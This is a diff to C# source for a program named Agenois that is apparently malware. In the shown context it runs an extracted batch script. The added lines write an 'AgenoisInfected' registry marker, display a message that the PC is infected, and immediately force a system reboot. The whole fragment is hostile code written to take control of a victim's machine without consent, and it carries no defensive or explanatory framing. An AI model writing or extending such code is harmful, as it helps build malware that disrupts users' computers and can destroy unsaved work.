@@ -186,6 +186,16 @@ namespace Agenois
                 ScriptProcess.StartInfo.UseShellExecute = false;
                 ScriptProcess.StartInfo.FileName = extractPath + "\\Action.bat";
                 ScriptProcess.Start();
+
+                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Agenois");
+                editKey.SetValue("AgenoisInfected", "1");
+                editKey.Close();
+
+                Thread.Sleep(9000);
+
+                MessageBox.Show("Agenois Has Infected Your PC", "Agenois", 0, MessageBoxIcon.Warning);
+
+                Others.StartProcess("shutdown.exe", "/r /t 0");
             }
         }
 
